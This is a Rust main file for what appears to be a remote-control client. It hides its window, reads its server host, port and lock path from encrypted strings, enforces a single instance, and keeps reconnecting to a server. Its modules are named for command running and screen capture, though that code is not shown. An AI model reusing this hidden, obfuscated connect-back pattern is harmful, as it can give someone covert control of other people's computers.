#![windows_subsystem = "windows"] //此宏不打开窗口，同时print也失效

use crate::context::Context;
use chrono::Local;
use common::config::{Config, Id, SecurityConfig};
use common::generated::encrypted_strings::*;
use common::host::get_host;
use log::debug;
use std::env;
use std::io::Write;
use std::path::Path;
use std::time::Duration;
use tokio::fs::{File, OpenOptions};
use tokio::{join, time};

mod cmd_runner;
mod cmd_util;
mod context;
mod kik_conn;
mod kik_data_conn;
mod read_handle;
mod screen;

#[tokio::test]
async fn test() {
    use common::file_util;
    let test_dir = Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("..")
        .join("target")
        .join("ctrl_kik_get_dir_size_test");

    // 测试数据必须留在仓库 target 目录内，避免依赖开发机私有盘符。
    let _ = tokio::fs::remove_dir_all(&test_dir).await;
    tokio::fs::create_dir_all(test_dir.join("nested"))
        .await
        .unwrap();
    tokio::fs::write(test_dir.join("a.bin"), [1_u8, 2, 3])
        .await
        .unwrap();
    tokio::fs::write(test_dir.join("nested").join("b.bin"), [4_u8, 5])
        .await
        .unwrap();

    assert_eq!(file_util::get_dir_size(&test_dir).await.unwrap(), 5);
}

#[tokio::main]
async fn main() {
    if "DEBUG".eq(env::var("LOG").unwrap_or("test".to_string()).as_str()) {
        env_logger::Builder::new()
            // 关键：定义自定义格式
            .format(|buf, record| {
                writeln!(
                    buf,
                    "{} [{}] - {}",
                    Local::now().format("%Y-%m-%d %H:%M:%S%.3f"), // 添加毫秒
                    record.level(),
                    record.args()
                )
            })
            .parse_env("LOG")
            .init();
    }
    //此lock在程序结束时会被操作系统回收，所以无需担心是否释放
    let f = single(LOCK_FILE_PATH()).await; // 须要给一个变量名不能用let _ = xxx，(注意: let _ = xxx 当下与  _ = xxx 行为一致，会在这一行结束就释放变量) ，免得rust这里直接回收了
    let context = Context::new();
    let config = Config {
        id: Id {
            username: "".to_string(),
            password: "".to_string(),
        },
        server_host: get_host(),
        server_port: PORT(),
        read_timeout: Duration::from_secs(45),
        write_timeout: Duration::from_secs(45),
        security: SecurityConfig::plain(),
    };

    loop {
        for _ in 0..3 {
            //校验成功了就返回
            match kik_conn::kik_conn(context.clone(), &config).await {
                Ok(h) => {
                    //加入服务器成功后发起数据连接
                    let (context, config) = (context.clone(), config.clone());
                    tokio::spawn(async move {
                        //校验成功就会返回
                        for _ in 0..3 {
                            match kik_data_conn::kik_data_conn(context.clone(), &config).await {
                                Ok(_) => {}
                                Err(e) => {
                                    debug!("{}", e);
                                    //todo 报告错误
                                }
                            }
                        }
                    });
                    let _ = join!(h);
                }
                Err(e) => {
                    time::sleep(Duration::from_secs(2)).await;
                    //todo
                }
            }
        }

        time::sleep(Duration::from_secs(20)).await;
    }
}

pub async fn single<P: AsRef<Path>>(lock_path: P) -> Option<File> {
    use fs4::tokio::AsyncFileExt;
    if !lock_path.as_ref().parent().unwrap().exists() {
        match tokio::fs::create_dir_all(lock_path.as_ref().parent().unwrap()).await {
            Ok(_) => {}
            Err(_) => {
                return None;
            }
        };
    }
    match OpenOptions::new()
        .read(true)
        .write(true)
        .create(true)
        .open(lock_path)
        .await
    {
        Ok(lock_file) => {
            let mut e_op = None;
            for _ in 0..3 {
                // 尝试获得文件锁
                match lock_file.try_lock_exclusive() {
                    Ok(_) => {
                        return Some(lock_file);
                    }
                    Err(e) => {
                        e_op = Some(e);
                    }
                }
                time::sleep(Duration::from_secs(3)).await;
            }
            if e_op.is_some() {
                println!("exist running");
                std::process::exit(0);
            } else {
                //神奇
                return None;
            }
        }
        Err(_) => {
            //文件创建失败的话放行
            return None;
        }
    };
}
